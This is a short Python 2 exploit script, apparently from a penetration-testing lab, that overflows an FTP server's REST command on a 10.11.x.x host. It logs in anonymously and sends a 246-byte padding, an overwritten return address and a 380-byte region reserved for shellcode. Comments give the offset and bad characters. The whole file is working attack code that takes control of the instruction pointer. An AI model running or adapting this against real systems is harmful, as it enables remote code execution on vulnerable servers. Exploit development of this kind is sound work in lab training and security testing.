import socket
#with open("pattern.txt","r") as file:
#	buffer=file.read().replace("\r","")
#print len(buffer)
#print buffer
#pattern : 41326941 , pattern offset match at 246
#increase total buffer length to 600 so that "C"'s can occupy min 350 bytes of space
#badchars = \x00 \x0a \x0d
buffer="A"*246 + "\x71\xe8\xca\x77" + "C"*380
ip="10.11.20.10"
try:
	print "\n locating eip by crashing with %s bytes" %len(buffer)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,21))
	s.send("USER anonymous\r\n")
	s.recv(1024)
	s.send("PASS test\r\n")
	s.recv(1024)
	s.send("REST " + buffer + "\r\n")
	s.send("QUIT\r\n")
	s.close()
except:
	print "\nConnection error"
